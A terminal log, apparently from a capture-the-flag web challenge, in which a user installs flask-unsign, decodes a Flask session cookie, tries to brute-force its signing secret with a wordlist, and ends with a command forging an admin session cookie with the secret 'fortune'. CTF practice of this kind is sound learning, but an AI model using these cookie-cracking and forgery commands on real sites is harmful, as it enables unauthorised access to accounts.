

srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ pipx ensurepath
Success! Added /home/srriv/.local/bin to the PATH environment variable.

Consider adding shell completions for pipx. Run 'pipx completions' for instructions.

You will need to open a new terminal or re-login for the PATH changes to take effect.

Otherwise pipx is ready to go! ✨ 🌟 ✨
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ pipx install flask-unsign
  installed package flask-unsign 1.2.1, installed using Python 3.12.3
  These apps are now globally available
    - flask-unsign
⚠️  Note: '/home/srriv/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your
    PATH is updated. Run `pipx ensurepath` to automatically add it, or manually modify your PATH in your shell's config file (i.e.
    ~/.bashrc).
done! ✨ 🌟 ✨
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ echo "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-7aXQ.KaGZCrkgomkQkbE2mKVDTQORrgQ" | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-7aXQ.KaGZCrkgomkQkbE2mKVDTQORrgQ" --wordlist galletas.txt
flask-unsign: command not found
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ pipx ensurepath
/home/srriv/.local/bin has been been added to PATH, but you need to open a new terminal or re-login for this PATH change to take
    effect.

You will need to open a new terminal or re-login for the PATH changes to take effect.

Otherwise pipx is ready to go! ✨ 🌟 ✨
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-7aXQ.KaGZCrkgomkQkbE2mKVDTQORrgQ" --wordlist galletas.txt
flask-unsign: command not found
srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$

flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "fortune"